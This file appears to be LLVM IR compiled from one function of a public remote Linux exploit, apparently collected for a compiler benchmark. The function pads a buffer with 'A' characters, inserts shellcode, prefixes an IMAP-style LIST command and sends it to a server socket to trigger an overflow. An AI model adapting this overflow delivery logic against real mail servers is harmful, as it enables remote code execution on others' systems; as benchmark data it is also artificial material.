; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1209.c_sendsc.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1209.c_sendsc.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@b = common dso_local global i8* null, align 8
@sc = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [4 x i8] c" A\0A\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"3 LIST \00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"[-] send()\00", align 1
@i = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [10 x i8] c"Completed\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"BAD\00", align 1
@.str.5 = private unnamed_addr constant [18 x i8] c"[-] LIST failled.\00", align 1
@.str.6 = private unnamed_addr constant [22 x i8] c"[+] shellcode sended.\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @sendsc(i32 %0) #0 {
  %2 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %3 = load i8*, i8** @b, align 8
  %4 = call i32 @memset(i8* %3, i32 65, i32 1024)
  %5 = load i8*, i8** @b, align 8
  %6 = getelementptr inbounds i8, i8* %5, i64 900
  %7 = load i8*, i8** @sc, align 8
  %8 = load i8*, i8** @sc, align 8
  %9 = call i32 @strlen(i8* %8)
  %10 = call i32 @memcpy(i8* %6, i8* %7, i32 %9)
  %11 = load i8*, i8** @b, align 8
  %12 = getelementptr inbounds i8, i8* %11, i64 1020
  %13 = call i32 @memcpy(i8* %12, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i32 3)
  %14 = load i8*, i8** @b, align 8
  %15 = call i32 @memcpy(i8* %14, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i32 7)
  %16 = load i32, i32* %2, align 4
  %17 = load i8*, i8** @b, align 8
  %18 = load i8*, i8** @b, align 8
  %19 = call i32 @strlen(i8* %18)
  %20 = call i32 @send(i32 %16, i8* %17, i32 %19, i32 0)
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %25

22:                                               ; preds = %1
  %23 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  %24 = call i32 @exit(i32 1) #3
  unreachable

25:                                               ; preds = %1
  %26 = load i8*, i8** @b, align 8
  %27 = call i32 @memset(i8* %26, i32 0, i32 1024)
  br label %28

28:                                               ; preds = %49, %25
  %29 = load i32, i32* %2, align 4
  %30 = load i8*, i8** @b, align 8
  %31 = call i32 @recv(i32 %29, i8* %30, i32 1023, i32 0)
  store i32 %31, i32* @i, align 4
  %32 = icmp ne i32 %31, -1
  br i1 %32, label %33, label %50

33:                                               ; preds = %28
  %34 = load i8*, i8** @b, align 8
  %35 = load i32, i32* @i, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 0, i8* %37, align 1
  %38 = load i8*, i8** @b, align 8
  %39 = call i32* @strstr(i8* %38, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %40 = icmp ne i32* %39, null
  br i1 %40, label %41, label %42

41:                                               ; preds = %33
  br label %50

42:                                               ; preds = %33
  %43 = load i8*, i8** @b, align 8
  %44 = call i32* @strstr(i8* %43, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0))
  %45 = icmp ne i32* %44, null
  br i1 %45, label %46, label %49

46:                                               ; preds = %42
  %47 = call i32 @puts(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.5, i64 0, i64 0))
  %48 = call i32 @exit(i32 1) #3
  unreachable

49:                                               ; preds = %42
  br label %28

50:                                               ; preds = %41, %28
  %51 = call i32 @puts(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0))
  ret void
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32* @strstr(i8*, i8*) #1

declare dso_local i32 @puts(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
